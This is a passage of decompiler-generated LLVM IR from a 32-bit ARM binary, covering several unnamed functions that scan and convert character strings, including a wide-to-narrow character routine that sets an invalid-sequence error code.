  %v1_15944 = load i32, i32* @fp, align 4
  store i32 %v1_15944, i32* @r6, align 4
  %v2_15a0815 = load i8, i8* %v1_15930, align 1
  %v3_15a0816 = zext i8 %v2_15a0815 to i32
  store i32 %v3_15a0816, i32* %r2.global-to-local, align 4
  %v2_15a0c17 = icmp eq i8 %v2_15a0815, 0
  store i1 %v2_15a0c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a0c17, label %dec_label_pc_15a24, label %dec_label_pc_15a14.preheader

dec_label_pc_15a14.preheader:                     ; preds = %dec_label_pc_15a08.preheader
  %v2_15a1482 = load i8, i8* %v1_1593c, align 1
  %v3_15a1483 = zext i8 %v2_15a1482 to i32
  store i32 %v3_15a1483, i32* %r3.global-to-local, align 4
  %v9_15a1886 = icmp eq i8 %v2_15a1482, %v2_15a0815
  store i1 %v9_15a1886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a1886, label %dec_label_pc_15a24, label %bb74

dec_label_pc_15950:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15954 = load i32, i32* %v2_15904, align 4
  store i32 %v2_15954, i32* %r3.global-to-local, align 4
  store i32 %v1_15764, i32* %r2.global-to-local, align 4
  %v9_1595c = icmp eq i32 %v2_1596088, %v1_15764
  store i1 %v9_1595c, i1* %cpsr_z.global-to-local, align 1
  %v5_15960 = mul i32 %v2_1596088, 4
  %v6_15960 = add i32 %v2_15954, %v5_15960
  %v7_15960 = inttoptr i32 %v6_15960 to i32*
  store i32 %v0_1596087, i32* %v7_15960, align 4
  br i1 %v9_1595c, label %dec_label_pc_15968, label %dec_label_pc_15974

dec_label_pc_15968:                               ; preds = %dec_label_pc_15950
  store i32 %v1_15770, i32* %r3.global-to-local, align 4
  store i1 %v2_1596c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1596c, label %dec_label_pc_15974, label %dec_label_pc_15994

dec_label_pc_15974:                               ; preds = %dec_label_pc_15968, %dec_label_pc_15950
  %v0_15974 = load i32, i32* @r7, align 4
  %v1_15974 = inttoptr i32 %v0_15974 to i8*
  %v2_15974 = load i8, i8* %v1_15974, align 1
  %v3_15974 = zext i8 %v2_15974 to i32
  store i32 %v3_15974, i32* %r3.global-to-local, align 4
  %v2_15978 = icmp eq i8 %v2_15974, 0
  store i1 %v2_15978, i1* %cpsr_z.global-to-local, align 1
  %v0_1597c = load i32, i32* @r4, align 4
  store i32 %v0_1597c, i32* @r0, align 4
  %v1_15980 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15978, i32 %v1_15980, i32 %v0_15974
  store i32 %storemerge, i32* @r1, align 4
  %v0_15988 = call i32 @function_17a78()
  store i32 %v0_15988, i32* %r0.global-to-local, align 4
  %v0_1598c = load i32, i32* @r4, align 4
  %v2_1598c = add i32 %v0_1598c, %v0_15988
  store i32 %v2_1598c, i32* @r4, align 4
  br label %dec_label_pc_159cc

dec_label_pc_15994:                               ; preds = %dec_label_pc_15968
  %v0_15994 = load i32, i32* @r4, align 4
  store i32 %v0_15994, i32* @r0, align 4
  %v0_15998 = load i32, i32* @r7, align 4
  %v1_15998 = inttoptr i32 %v0_15998 to i8*
  %v2_15998 = load i8, i8* %v1_15998, align 1
  %v3_15998 = zext i8 %v2_15998 to i32
  %v5_1599c = call i32 @function_17d0c(i32 %v0_15994, i32 %v3_15998, i32 %v1_15764, i32 %v1_15770)
  store i32 %v5_1599c, i32* %r0.global-to-local, align 4
  store i32 %v1_15760, i32* %r2.global-to-local, align 4
  store i1 %v2_15914, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1599c, i32* @r4, align 4
  br i1 %v2_15914, label %dec_label_pc_159cc, label %dec_label_pc_159b8

dec_label_pc_159b4:                               ; preds = %dec_label_pc_159b8
  %v1_159b4 = add i32 %v0_159cc.pre, -1
  store i32 %v1_159b4, i32* @r4, align 4
  br label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_15994, %dec_label_pc_159b4
  %v0_159b8 = phi i32 [ %v1_159b4, %dec_label_pc_159b4 ], [ %v5_1599c, %dec_label_pc_15994 ]
  %v1_159b8 = add i32 %v0_159b8, -1
  %v2_159b8 = inttoptr i32 %v1_159b8 to i8*
  %v3_159b8 = load i8, i8* %v2_159b8, align 1
  %v4_159b8 = zext i8 %v3_159b8 to i32
  %v0_159bc = load i32, i32* @sl, align 4
  store i32 %v0_159bc, i32* @r0, align 4
  %v2_159c0 = call i32 @function_12308(i32 %v0_159bc, i32 %v4_159b8)
  store i32 %v2_159c0, i32* %r0.global-to-local, align 4
  %v2_159c4 = icmp eq i32 %v2_159c0, 0
  store i1 %v2_159c4, i1* %cpsr_z.global-to-local, align 1
  %v0_159cc.pre = load i32, i32* @r4, align 4
  br i1 %v2_159c4, label %dec_label_pc_159cc, label %dec_label_pc_159b4

dec_label_pc_159cc:                               ; preds = %dec_label_pc_159b8, %dec_label_pc_15994, %dec_label_pc_15974
  %v3_159d8 = phi i32 [ %v5_1599c, %dec_label_pc_15994 ], [ %v2_1598c, %dec_label_pc_15974 ], [ %v0_159cc.pre, %dec_label_pc_159b8 ]
  %v1_159cc = inttoptr i32 %v3_159d8 to i8*
  %v2_159cc = load i8, i8* %v1_159cc, align 1
  %v3_159cc = zext i8 %v2_159cc to i32
  store i32 %v3_159cc, i32* %r2.global-to-local, align 4
  %v0_159d0 = load i32, i32* @r7, align 4
  %v1_159d0 = inttoptr i32 %v0_159d0 to i8*
  %v2_159d0 = load i8, i8* %v1_159d0, align 1
  %v3_159d0 = zext i8 %v2_159d0 to i32
  store i32 %v3_159d0, i32* %r3.global-to-local, align 4
  %v9_159d4 = icmp eq i8 %v2_159d0, %v2_159cc
  store i1 %v9_159d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_159d4, label %bb71, label %dec_label_pc_159e0

bb71:                                             ; preds = %dec_label_pc_159cc
  %v1_159d8 = load i32, i32* @fp, align 4
  %v2_159d8 = trunc i32 %v1_159d8 to i8
  store i8 %v2_159d8, i8* %v1_159cc, align 1
  %v0_159dc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_159dc.pr, label %bb73, label %.dec_label_pc_159e0_crit_edge

.dec_label_pc_159e0_crit_edge:                    ; preds = %bb71
  %v0_159e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_159e0

dec_label_pc_159e0:                               ; preds = %.dec_label_pc_159e0_crit_edge, %dec_label_pc_159cc
  %v0_159e0 = phi i32 [ %v0_159e0.pre, %.dec_label_pc_159e0_crit_edge ], [ %v3_159cc, %dec_label_pc_159cc ]
  %v2_159e0 = icmp eq i32 %v0_159e0, 0
  store i1 %v2_159e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_159e0, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_159e0
  %v1_159e4 = load i32, i32* @fp, align 4
  %v2_159e4 = trunc i32 %v1_159e4 to i8
  %v3_159e4 = load i32, i32* @r4, align 4
  %v4_159e4 = inttoptr i32 %v3_159e4 to i8*
  store i8 %v2_159e4, i8* %v4_159e4, align 1
  %v5_159e4 = load i32, i32* @r4, align 4
  %v6_159e4 = add i32 %v5_159e4, 1
  store i32 %v6_159e4, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_159e0, %bb72
  %v2_159e8 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_159e8, i32* %r3.global-to-local, align 4
  %v2_159ec = icmp eq i32 %v2_159e8, 0
  store i1 %v2_159ec, i1* %cpsr_z.global-to-local, align 1
  %v0_15a08.pre = load i32, i32* @r4, align 4
  br i1 %v2_159ec, label %dec_label_pc_15a04, label %dec_label_pc_159f4

dec_label_pc_159f4:                               ; preds = %bb73
  store i32 %v0_15a08.pre, i32* @r0, align 4
  %v1_159fc = inttoptr i32 %v0_15a08.pre to i8*
  %v2_159fc = call i32 @function_17c4c(i8* %v1_159fc)
  store i32 %v2_159fc, i32* %r0.global-to-local, align 4
  %v0_15a00 = load i32, i32* @r4, align 4
  %v2_15a00 = add i32 %v0_15a00, %v2_159fc
  store i32 %v2_15a00, i32* @r4, align 4
  br label %dec_label_pc_15a04

dec_label_pc_15a04:                               ; preds = %bb73, %dec_label_pc_159f4
  %v0_15a08 = phi i32 [ %v2_15a00, %dec_label_pc_159f4 ], [ %v0_15a08.pre, %bb73 ]
  %v0_15a04 = load i32, i32* @r6, align 4
  %v1_15a04 = add i32 %v0_15a04, 1
  store i32 %v1_15a04, i32* @r6, align 4
  %v1_15a08 = inttoptr i32 %v0_15a08 to i8*
  %v2_15a08 = load i8, i8* %v1_15a08, align 1
  %v3_15a08 = zext i8 %v2_15a08 to i32
  store i32 %v3_15a08, i32* %r2.global-to-local, align 4
  %v2_15a0c = icmp eq i8 %v2_15a08, 0
  store i1 %v2_15a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a0c, label %dec_label_pc_15a24, label %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge

dec_label_pc_15a04.dec_label_pc_15a14_crit_edge:  ; preds = %dec_label_pc_15a04
  %v0_15a14.pre = load i32, i32* @r7, align 4
  %v1_15a14 = inttoptr i32 %v0_15a14.pre to i8*
  %v2_15a14 = load i8, i8* %v1_15a14, align 1
  %v3_15a14 = zext i8 %v2_15a14 to i32
  store i32 %v3_15a14, i32* %r3.global-to-local, align 4
  %v9_15a18 = icmp eq i8 %v2_15a14, %v2_15a08
  store i1 %v9_15a18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15a18, label %dec_label_pc_15a24, label %bb74

bb74:                                             ; preds = %dec_label_pc_15a14.preheader, %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge
  %v2_1596088 = phi i32 [ %v1_15a04, %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge ], [ %v1_15944, %dec_label_pc_15a14.preheader ]
  %v0_1596087 = phi i32 [ %v0_15a08, %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge ], [ %v0_15a0813, %dec_label_pc_15a14.preheader ]
  %v2_15a1c = load i32, i32* @sb, align 4
  %v3_15a1c = sub i32 %v2_1596088, %v2_15a1c
  %v5_15a1c = xor i32 %v2_15a1c, %v2_1596088
  %v6_15a1c = xor i32 %v3_15a1c, %v2_1596088
  %v7_15a1c = and i32 %v6_15a1c, %v5_15a1c
  %v8_15a1c = icmp slt i32 %v7_15a1c, 0
  %v9_15a1c = icmp slt i32 %v3_15a1c, 0
  %v10_15a1c = icmp eq i32 %v2_1596088, %v2_15a1c
  store i1 %v10_15a1c, i1* %cpsr_z.global-to-local, align 1
  %v2_15a20 = xor i1 %v9_15a1c, %v8_15a1c
  br i1 %v2_15a20, label %dec_label_pc_15950, label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_15a14.preheader, %bb74, %dec_label_pc_15a04, %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge, %dec_label_pc_15a08.preheader
  %v0_15a28 = phi i32 [ %v1_15944, %dec_label_pc_15a08.preheader ], [ %v1_15944, %dec_label_pc_15a14.preheader ], [ %v2_1596088, %bb74 ], [ %v1_15a04, %dec_label_pc_15a04 ], [ %v1_15a04, %dec_label_pc_15a04.dec_label_pc_15a14_crit_edge ]
  store i32 %v3_15748, i32* %r2.global-to-local, align 4
  %v9_15a28 = icmp eq i32 %v0_15a28, %v3_15748
  store i1 %v9_15a28, i1* %cpsr_z.global-to-local, align 1
  %v6_15a2c = icmp slt i32 %v0_15a28, %v3_15748
  br i1 %v6_15a2c, label %dec_label_pc_15a30, label %dec_label_pc_15a3c

dec_label_pc_15a30:                               ; preds = %dec_label_pc_15a24
  %v0_15a30 = load i32, i32* @r8, align 4
  %v1_15a30 = and i32 %v0_15a30, 1048576
  %v2_15a30 = icmp eq i32 %v1_15a30, 0
  store i1 %v2_15a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15a30, label %dec_label_pc_15788.backedge, label %dec_label_pc_15a38

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a30, %dec_label_pc_158f0, %.thread, %dec_label_pc_15724
  br label %dec_label_pc_15a3c

dec_label_pc_15a3c:                               ; preds = %dec_label_pc_15a24, %dec_label_pc_1580c, %dec_label_pc_15a38
  %v0_15a3c = phi i32 [ %v0_1581c, %dec_label_pc_1580c ], [ 0, %dec_label_pc_15a38 ], [ %v0_15a28, %dec_label_pc_15a24 ]
  store i32 %v0_15a3c, i32* %r0.global-to-local, align 4
  store i32 %v3_15724, i32* @r4, align 4
  store i32 %v6_15724, i32* @r5, align 4
  store i32 %v9_15724, i32* @r6, align 4
  store i32 %v12_15724, i32* @r7, align 4
  store i32 %v15_15724, i32* @r8, align 4
  store i32 %v18_15724, i32* @sb, align 4
  store i32 %v21_15724, i32* @sl, align 4
  store i32 %v24_15724, i32* @fp, align 4
  ret i32 %v0_15a3c

; uselistorder directives
  uselistorder i32 %v0_15a3c, { 1, 0 }
  uselistorder i32 %v0_15a28, { 0, 2, 1 }
  uselistorder i32 %v3_15a1c, { 1, 0 }
  uselistorder i32 %v2_15a1c, { 1, 0, 2 }
  uselistorder i32 %v2_1596088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_15a18, { 1, 0 }
  uselistorder i32 %v0_15a08.pre, { 0, 2, 1 }
  uselistorder i32 %v5_1599c, { 1, 0, 2, 3 }
  uselistorder i1 %v9_15a1886, { 1, 0 }
  uselistorder i1 %v9_15940, { 1, 0 }
  uselistorder i32 %v3_15918, { 0, 2, 1, 3 }
  uselistorder i1 %v7_158f0, { 1, 0 }
  uselistorder i1 %v8_158e8, { 1, 0 }
  uselistorder i32 %v3_158b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_158a8, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_15890, { 1, 0, 2 }
  uselistorder i32 %v1_15880, { 1, 0, 2 }
  uselistorder i32 %v0_1586c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15864, { 1, 0 }
  uselistorder i32 %v1_15850, { 1, 0 }
  uselistorder i32 %v1_1584c, { 1, 0 }
  uselistorder i32 %v1_1580c, { 2, 0, 1 }
  uselistorder i32 %v0_157f4, { 1, 0 }
  uselistorder i32 %v1_157e4, { 0, 2, 1 }
  uselistorder i1 %v2_15914, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15770, { 2, 0, 1, 3 }
  uselistorder i32 %v1_15764, { 2, 1, 0 }
  uselistorder i32 %v3_1574c, { 1, 0 }
  uselistorder i32 %v3_15748, { 2, 1, 0 }
  uselistorder i32 %v1_15740, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 27, 26, 4, 6, 5, 8, 9, 25, 7, 24, 10, 23, 11, 12, 15, 13, 14, 22, 16, 17, 18, 21, 19, 20, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 33, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 ()* @function_11fd0, { 29, 27, 9, 26, 28, 25, 24, 23, 21, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 8, 7, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_15a3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a24, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_15a04, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159b8, { 1, 0 }
  uselistorder label %dec_label_pc_15788.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15930, { 1, 0 }
  uselistorder label %dec_label_pc_158f0, { 1, 0 }
  uselistorder label %dec_label_pc_158e4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_158a8, { 1, 0 }
  uselistorder label %dec_label_pc_157dc, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_15a4c(i32* %arg1) local_unnamed_addr {
dec_label_pc_15a4c:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_15a50 = icmp eq i32* %arg1, null
  br i1 %v2_15a50, label %dec_label_pc_15a78, label %dec_label_pc_15a58

dec_label_pc_15a58:                               ; preds = %dec_label_pc_15a4c
  %v2_15a58 = load i32, i32* %arg1, align 4
  %v1_15a5c = inttoptr i32 %v2_15a58 to i16*
  %v2_15a5c = call i32 @function_15bf0(i16* %v1_15a5c)
  %v0_15a60 = load i32, i32* @r4, align 4
  %v1_15a60 = add i32 %v0_15a60, 20
  %v2_15a60 = inttoptr i32 %v1_15a60 to i32*
  %v3_15a60 = load i32, i32* %v2_15a60, align 4
  %v2_15a64 = icmp eq i32 %v3_15a60, 0
  br i1 %v2_15a64, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_15a58
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_15a58, %bb
  store i32 88688, i32* @lr, align 4
  %v1_15a6c = xor i1 %v2_15a64, true
  call void @__pseudo_cond_branch(i1 %v1_15a6c, i32 ptrtoint (i32* @global_var_13684.435 to i32))
  %v0_15a70 = load i32, i32* @r4, align 4
  store i32 %v0_15a70, i32* @r0, align 4
  %v0_15a74 = call i32 @function_13684()
  br label %dec_label_pc_15a78

dec_label_pc_15a78:                               ; preds = %dec_label_pc_15a4c, %bb6
  %v1_15a7c = phi i32 [ 0, %dec_label_pc_15a4c ], [ %v0_15a74, %bb6 ]
  ret i32 %v1_15a7c

; uselistorder directives
  uselistorder label %dec_label_pc_15a78, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_15a80(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a80:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15a8c = load i32, i32* @r4, align 4
  store i32 %v3_15a8c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1b2d8.438 to i32), i32* @r1, align 4
  %v0_15a94 = call i32 @function_15da4()
  store i32 %v0_15a94, i32* %r0.global-to-local, align 4
  store i32 %v0_15a94, i32* @r4, align 4
  %v2_15a98 = icmp eq i32 %v0_15a94, 0
  br i1 %v2_15a98, label %bb, label %dec_label_pc_15aa4

bb:                                               ; preds = %dec_label_pc_15a80
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a80
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_15aac = call i32 @function_17f30(i32 1, i32 24)
  store i32 %v2_15aac, i32* %r0.global-to-local, align 4
  %v2_15ab0 = icmp eq i32 %v2_15aac, 0
  br i1 %v2_15ab0, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_15aa4
  %v1_15ab4 = load i32, i32* @r4, align 4
  %v3_15ab4 = inttoptr i32 %v2_15aac to i32*
  store i32 %v1_15ab4, i32* %v3_15ab4, align 4
  %v1_15abc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_15aa4, %bb4
  %v1_15abc = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_15aa4 ], [ %v1_15abc.pre, %bb4 ]
  %v2_15ab8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ab8, i32* @r4, align 4
  ret i32 %v1_15abc

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 1, 2, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_15ac8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_15ac8:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_15ac8 = load i32, i32* @lr, align 4
  %v2_15acc = icmp eq i32 %arg1, 0
  br i1 %v2_15acc, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_15ac8
  br label %bb11

bb:                                               ; preds = %dec_label_pc_15ac8
  %v3_15ad4 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_15afc = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_15ae8 = phi i32 [ %arg1, %.thread ], [ %v3_15ad4, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_15ae4 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_15ae4, i32* @ip, align 4
  %v2_15aec = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_15ae4, i32* %stack_var_-16, align 4
  store i32 %v0_15afc, i32* %stack_var_-12, align 4
  %v5_15b04 = inttoptr i32 %v0_15ae8 to i8*
  %v6_15b04 = call i32 @function_15b40(i8* %v5_15b04, i32 %v2_15aec, i32 1, i32 16, i32 %arg3)
  %v2_15b08 = icmp eq i32 %v6_15b04, 0
  br i1 %v2_15b08, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_15b18 = phi i32 [ %v6_15b04, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_15ac8, i32* @lr, align 4
  ret i32 %v1_15b18

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_15b1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_15b1c:
  store i32 %arg1, i32* @r3, align 4
  %v0_15b30 = load i32, i32* @r0, align 4
  %v1_15b30 = load i32, i32* @r1, align 4
  %v5_15b30 = inttoptr i32 %v0_15b30 to i8*
  %v6_15b30 = call i32 @function_15b40(i8* %v5_15b30, i32 %v1_15b30, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_15b30

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_15b40(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_15b40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15b40 = load i32, i32* @r4, align 4
  store i32 %v3_15b40, i32* %stack_var_-12, align 4
  %v10_15b44 = icmp eq i32 %tmp, %arg2
  store i1 %v10_15b44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_15b44, label %dec_label_pc_15b5c, label %bb

bb:                                               ; preds = %dec_label_pc_15b40
  %v4_15b48 = icmp eq i8* %arg1, null
  store i1 %v4_15b48, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_15b48, label %dec_label_pc_15b5c.thread, label %bb39

dec_label_pc_15b5c.thread:                        ; preds = %bb
  %v2_15b4c = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_15b5c:                               ; preds = %dec_label_pc_15b40
  %v2_15b4c1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_15b5c = icmp eq i8* %arg1, null
  store i1 %v3_15b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15b5c, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15b5c
  store i32 %v2_15b4c1, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_15b5c, %dec_label_pc_15b5c.thread
  %storemerge20 = phi i32 [ %v2_15b4c1, %dec_label_pc_15b5c ], [ %v2_15b4c, %dec_label_pc_15b5c.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_15bb828 = phi i32 [ %v2_15b4c1, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_15b74 = load i32, i32* @r3, align 4
  %v3_15b74 = icmp uge i32 %v0_15b74, %arg3
  %arg3.v0_15b74 = select i1 %v3_15b74, i32 %arg3, i32 %v0_15b74
  store i32 %arg3.v0_15b74, i32* %r5.global-to-local, align 4
  %v1_15b80 = inttoptr i32 %arg2 to i32*
  %v2_15b80 = load i32, i32* %v1_15b80, align 4
  store i32 %v2_15b80, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_15b74, i32* %r0.global-to-local, align 4
  %v2_15bcc22 = icmp eq i32 %arg3.v0_15b74, 0
  store i1 %v2_15bcc22, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bcc22, label %dec_label_pc_15bd4, label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %.thread14.thread, %dec_label_pc_15bc4.dec_label_pc_15b8c_crit_edge
  %v2_15bb8 = phi i32 [ %v2_15bc4, %dec_label_pc_15bc4.dec_label_pc_15b8c_crit_edge ], [ %v2_15bb828, %.thread14.thread ]
  %v0_15b98 = phi i32 [ %v0_15b8c.pre, %dec_label_pc_15bc4.dec_label_pc_15b8c_crit_edge ], [ %v2_15b80, %.thread14.thread ]
  %v1_15b8c = inttoptr i32 %v0_15b98 to i32*
  %v2_15b8c = load i32, i32* %v1_15b8c, align 4
  %v7_15b90 = icmp eq i32 %v2_15b8c, 127
  store i1 %v7_15b90, i1* %cpsr_z.global-to-local, align 1
  %v1_15b94 = urem i32 %v2_15b8c, 256
  store i32 %v1_15b94, i32* @ip, align 4
  %v1_15b98 = add i32 %v0_15b98, 4
  store i32 %v1_15b98, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_15b8c, 128
  br i1 %tmp45, label %dec_label_pc_15bb4, label %dec_label_pc_15ba0

dec_label_pc_15ba0:                               ; preds = %dec_label_pc_15b8c
  %v0_15ba0 = call i32 @function_1095c()
  store i32 %v0_15ba0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_15bac = inttoptr i32 %v0_15ba0 to i32*
  store i32 84, i32* %v2_15bac, align 4
  %v0_15be0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15be0

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15b8c
  %v2_15bb4 = icmp eq i32 %v1_15b94, 0
  store i1 %v2_15bb4, i1* %cpsr_z.global-to-local, align 1
  %v1_15bb8 = trunc i32 %v2_15b8c to i8
  %v3_15bb8 = inttoptr i32 %v2_15bb8 to i8*
  store i8 %v1_15bb8, i8* %v3_15bb8, align 1
  %v0_15bbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15bbc, label %.dec_label_pc_15bd4_crit_edge, label %dec_label_pc_15bc4

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15bb4
  %v0_15bc4 = load i32, i32* %lr.global-to-local, align 4
  %v1_15bc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_15bc4 = add i32 %v1_15bc4, %v0_15bc4
  store i32 %v2_15bc4, i32* %lr.global-to-local, align 4
  %v0_15bc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_15bc8 = add i32 %v0_15bc8, -1
  store i32 %v1_15bc8, i32* %r0.global-to-local, align 4
  %v2_15bcc = icmp eq i32 %v1_15bc8, 0
  store i1 %v2_15bcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bcc, label %dec_label_pc_15bd4, label %dec_label_pc_15bc4.dec_label_pc_15b8c_crit_edge

dec_label_pc_15bc4.dec_label_pc_15b8c_crit_edge:  ; preds = %dec_label_pc_15bc4
  %v0_15b8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15b8c

.dec_label_pc_15bd4_crit_edge:                    ; preds = %dec_label_pc_15bb4
  %v1_15bbc = load i32, i32* @ip, align 4
  store i32 %v1_15bbc, i32* %r2.global-to-local, align 4
  %v0_15bd4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_15bd4

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15bc4, %.dec_label_pc_15bd4_crit_edge, %.thread14.thread
  %v0_15bd4 = phi i32 [ %v0_15bd4.pre, %.dec_label_pc_15bd4_crit_edge ], [ %v2_15bb828, %.thread14.thread ], [ %v2_15bc4, %dec_label_pc_15bc4 ]
  %v1_15bd4 = load i32, i32* @sp, align 4
